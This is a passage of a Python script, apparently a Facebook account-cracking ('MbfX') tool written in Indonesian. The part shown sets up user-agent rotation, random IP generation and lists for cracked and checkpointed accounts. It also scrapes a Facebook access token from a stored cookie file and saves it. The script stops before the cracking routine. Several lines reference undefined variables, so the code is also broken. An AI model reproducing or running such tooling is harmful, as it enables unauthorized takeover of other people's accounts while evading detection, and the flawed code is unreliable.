# /usr/bin/python
# McybearX Projeck
# Coded by McybearX
# Tools MbfX
# Versi 3.6
# Jangan Ubah botnyaa
#                     #
# Bot masih di pager!!!!
import time,os,random
try:
        tema = open(".tema.txt","r").read()
except IOError:
        tema = "default"
M = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"]);H = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"]);K = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"]);B = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"]);U = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"]);S = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
if "default" in tema:p="\x1b[1;97m";l="\x1b[1;97m";m="\x1b[1;91m";h="\x1b[1;92m";k="\x1b[1;93m";b="\x1b[1;94m";u="\x1b[1;95m";s="\x1b[1;96m"
elif "biru" in tema:k="\x1b[1;97m";l="\x1b[1;97m";p="\x1b[1;91m";h="\x1b[1;92m";u="\x1b[1;93m";m="\x1b[1;94m";s="\x1b[1;95m";b="\x1b[1;96m"
elif "merah" in tema:m="\x1b[1;97m";l="\x1b[1;97m";h="\x1b[1;91m";p="\x1b[1;92m";s="\x1b[1;93m";k="\x1b[1;94m";b="\x1b[1;95m";u="\x1b[1;96m"
elif "kuning" in tema:h="\x1b[1;97m";b="\x1b[1;97m";s="\x1b[1;91m";p = "\x1b[1;92m";k = "\x1b[1;93m";u = "\x1b[1;94m";l = "\x1b[1;95m";m = "\x1b[1;96m"
elif "random" in tema:h=H;b=B;s=S;p="\x1b[1;97m";k=K;u=U;l = "\x1b[1;97m";m=M
# McybearX
import time;emil=print;emil_lope_usup=print;balmond = "\x1b[1;95mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ";mx = balmond;ris = "\x1b[4;95m               \x1b[0;95m/\x1b[3;91mM\x1b[1;95mcybear\x1b[1;91mX\x1b[0;90m"
usup=input
try:
	import concurrent.futures
except ImportError:
	os.system("clear")
	emil("\n"+balmond+m+" Module Futures Belum Terinstall, Jalankan pip install futures")
	time.sleep(0.5)
	exit()
try:
	import requests
except ImportError:
	os.system("clear")
	emil("\n"+balmond+m+" Module Requests Belum Terinstall, Jalankan pip install requests")
	time.sleep(0.5)
	exit()
try:
	import bs4
except ImportError:
	os.system("clear")
	emil("\n"+balmond+m+" Module Bs4 Belum Terinstall, Jalankan pip install bs4")
	time.sleep(0.5)
	exit()
try:
	import mechanize
except ImportError:
	os.system("clear")
	emil("\n"+balmond+m+" Module Mechanize Belum Terinstall, Jalankan pip install mechanize")
	time.sleep(0.5)
	exit()
import concurrent.futures, requests, bs4, hashlib, mechanize, sys, random, json, re, ipaddress, calendar
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
from random import randint
from datetime import datetime
from datetime import date
ok = []
cp = []
id = []
opsit = []
sandi = []
katanya = []
batas = ris
line = ris
indah = ["jihan","Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
kamu = datetime.now()
cantiks = kamu.day
imuts = kamu.month
gemess = kamu.year
sayangs = indah[imuts]
manyun = date.today()
nama_h = calendar.day_name[manyun.weekday()]
if nama_h=="Sunday":
	nama_hari = "Minggu"
elif nama_h=="Monday":
	nama_hari = "Senin"
elif nama_h=="Tuesday":
	nama_hari = "Selasa"
elif nama_h=="Wednesday":
	nama_hari = "Rabu"
elif nama_h=="Thursday":
	nama_hari = "Kamis"
elif nama_h=="Friday":
	nama_hari = "Jumat"
elif nama_h=="Saturday":
	nama_hari = "Sabtu"
hck = "%s-%s-%s-%s"%(nama_hari,cantiks,sayangs,gemess)
semoga = []
berapa_d = []
joined_year = ["[2004 - 2005]","[2005 - 2006]","[2006 - 2007]","[2007 - 2008]","[2008]","[2009 - 2010]"]
old_gak = []
random_gak = []
try:
	jihan = open(".Emil.txt","r").read()
except IOError:
	pass
try:
	kalo_random = open("_McybearX_.txt","r").readlines()
except (IOError,KeyError):
	kalo_random = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15','Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 YaApp_Android/10.70 YaSearchBrowser/10.70', 'Mozilla/5.0 (Linux; Android 5.1.1; F1f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.10.2\t ', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 mCent/0.13.1214', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.4.994 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.8.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 OPR/52.2.2254.54723', 'Mozilla/5.0 (Linux; Android 10; V2032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.4.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/47.1.2254.147528', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.6.2) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/33.0.2254.125672', 'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.3beta', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.99 YaSearchBrowser/9.99', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 OPR/35.3.2254.129226', 'Mozilla/5.0 (Linux; U; Android 8.1.0; id-ID; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.5.1209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.0.0.50263AP', 'Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.1.991 Mobile Safari/537.36NULL', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.0.42081AP', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 6.0; ms-MY; vivo 1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.4.0.0\t ', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37f Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.828 U3/0.8.0 Mobile Safari/534.30', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.0) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 OPR/47.0.2254.146760', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.3.1219 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPR/52.2.2254.54574', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.1beta', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.0.4beta', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/28.0.2254.119224', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 OPR/51.0.2254.150807']
def jalan(ms):
	for sir in ms + "\n":
		sys.stdout.write(sir)
		sys.stdout.flush()
		time.sleep(1./30)
def iklan():
	os.system("cd ../../bin && python McybearX.py")

def MBEW(ms):
        for sir in ms + "\n":
                sys.stdout.write(sir)
                sys.stdout.flush()
                time.sleep(1./15)
def jala(ms):
        for sir in ms + "\n":
                sys.stdout.write(sir)
                sys.stdout.flush()
                time.sleep(1./200)

def clear():
	os.system("clear")
# LOGO
def banner():
	jala("""
\x1b[1;91m     __  ___ \x1b[1;95m__     ____\x1b[1;91m _  __
\x1b[1;91m    /  |/  /\x1b[1;95m/ /_   / __/\x1b[1;91m| |/ /
\x1b[1;91m   / /|_/ /\x1b[1;97m/ __ \ / /_  \x1b[1;91m|   /
\x1b[1;91m  / /  / /\x1b[1;97m/ /_/ // __/ \x1b[1;91m/   |
\x1b[1;91m /_/  /_/\x1b[1;97m/_.___//_/   \x1b[1;91m/_/|_|  \x1b[3;91mxx\x1b[1;95mLIMITED EDITION\x1b[1;91mxx\x1b[0;00m""")
MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES
def random_ipv4():
	return ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))


# LOGIN
def token_dari_coki():
    cookie = open(".kuekring.txt","r").read()
    try:
        headerz = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
        halaman = requests.get('https://business.facebook.com/creatorstudio/home', headers=headerz, cookies=cookie).content
        token_mbew = re.findall('{"userAccessToken":"(.*)","rightsManagerVersion"', str(halaman))[0]
        ber = open(".Emil.txt","w");bar.write(token_mbew);ber.close()
        emil ("\n"+mx+p+' Token FB Kamu : ' + s + token_mbew)
        with open('.Emil.txt', 'w') as (kuntul):
            kuntul.write(token_dev)
    except:
        emil(k + '\n [!] Gagal Ambil Token, Jangan Login fb Dalam mode Gratis!\n')
        emil(k + ' [!] Login Mengguanakn Token \n')
        exit()

def proses_masuk():
    cookie_dev = open(".kuekering.txt","r").read()
    with requests.Session() as (ses_pros_dev):
        proses_masuk = ses_pros_dev.get('https://mbasic.facebook.com', cookies=cookie_dev).content
        sop = BeautifulSoup(proses_masuk, 'html.parser')
        if 'zero/optin/legal/' in str(proses_masuk):
            try:
                sop_gr = BeautifulSoup(proses_masuk, 'html.parser').find('form')
                url_post = sop_gr['action']
                payload = {}
                for ganteng in sop_gr:
                    usup = gabteng
                    payload[usup.get('name')] = usup.get('value')

                ses_pros_dev.post('https://mbasic.facebook.com' + url_post, data=payload, cookies=cookie_dev)
            except:
                pass

    try:
        dev_sop = BeautifulSoup(proses_masuk, 'html.parser')
        sop_uwu = dev_sop.find('a', string='Bahasa Indonesia')
        ambil_url = 'https://mbasic.facebook.com' + sop_uwu['href']
